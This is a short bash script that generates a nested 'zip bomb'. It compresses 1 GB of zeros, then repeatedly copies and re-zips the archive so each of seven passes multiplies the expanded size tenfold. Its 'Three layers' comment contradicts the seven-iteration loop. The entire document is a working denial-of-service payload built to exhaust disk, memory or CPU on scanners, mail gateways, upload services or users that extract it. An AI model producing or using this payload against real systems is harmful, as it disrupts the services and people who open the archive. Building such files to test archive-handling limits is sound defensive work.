
# Generate a 1GB file and zip it
echo "Generating initial zipbomb.zip"
dd if=/dev/zero bs=1024 count=1048576 | zip -9 -q zipbomb.zip -

# Three layers
for j in {1..7}
do

echo "Inflating by 10..."
for i in {0..9}
do
	cp zipbomb.zip ${i}.zip
done

rm zipbomb.zip

zip -9 -q zipbomb.zip *.zip

for i in {0..9}
do
	rm ${i}.zip
done

done

